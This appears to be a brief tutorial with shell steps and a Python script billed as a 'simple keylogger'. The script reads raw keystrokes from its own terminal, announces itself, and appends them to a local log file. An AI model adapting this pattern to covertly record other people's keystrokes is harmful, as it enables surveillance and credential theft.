# Create script
nano simple_keylogger.py

# python code
#!/usr/bin/env python3

import os
import sys
import termios
import tty

def get_key():
    fd = sys.stdin.fileno()
    old_settings = termios.tcgetattr(fd)
    try:
        tty.setraw(fd)
        ch = sys.stdin.read(1)
    finally:
        termios.tcsetattr(fd, termios.TCSADRAIN, old_settings)
    return ch

logfile = "keylogs.txt"

print("Keylogger started... (Press Ctrl+C to stop)")

with open(logfile, "a") as f:
    try:
        while True:
            key = get_key()
            f.write(key)
            f.flush()
    except KeyboardInterrupt:
        print("\nKeylogger stopped.")

# make the script executable
chmod +x simple_keylogger.py

# run the script
python3 simple_keylogger.py

# view the logs
cat keylogs.txt
